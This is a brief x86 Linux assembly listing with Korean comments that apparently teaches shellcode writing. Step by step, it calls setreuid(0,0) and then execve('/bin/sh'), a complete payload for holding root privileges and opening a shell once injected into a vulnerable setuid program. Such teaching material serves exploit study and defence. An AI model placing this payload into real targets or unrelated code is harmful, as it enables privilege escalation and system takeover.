section .text		; asm의 코드 섹션 시작
global _start		; 전역 수준 선언

_start:			; 코드 레이블을 사용하는 습관에 따라
;setreuid (0,0)	; 앞서 본 바와 같음
xor eax, eax		; eax 레지스터를 지우고 다음 줄을 준비
mov al, 0x46		; syscall #을 10진수 70(16진수 46)으로 설정, 한 바이트
xor ebx, ebx		; ebx 레지스터 지우기
xor ecx, ecx		; exc 레지스터 지우기
int 0x80			; syscall을 실행하고자 커널 호출

; execve를 이용하여 셸코드 생성
xor eax, eax		; eax 레지스트리를 지우고 0으로 설정
push eax			; NULL 값을 스택에 푸시, eax의 값
push 0x68732f2f	; '//sh'를 스택에 푸시, 앞의 '/'로 패딩됨
push 0x6e69622f	; /bin을 스택이 푸시, 문자열이 거꾸로임에 주의
mov ebx, esp		; esp가 "/bin/sh"를 가리킴, ebx에 씀
push eax			; eax는 여전히 NULL, 스택이 char ** argv를 지우자
push ebx			; '/bin/sh'의 주소에 대한 포인터가 여전히 필요함, ebx 사용
mov ecx, esp		; 이제 esp가 argv의 주소를 가짐. 이를 ecx로 이동
xor edx, edx		; edx를 0(NULL)으로 채움, 필수는 아님
mov al, 0xb		; syscall #을 10진수 11(16진수 b)로 설정, 한 바이트
int 0x80			; syscall을 실행하고자 커널 호출
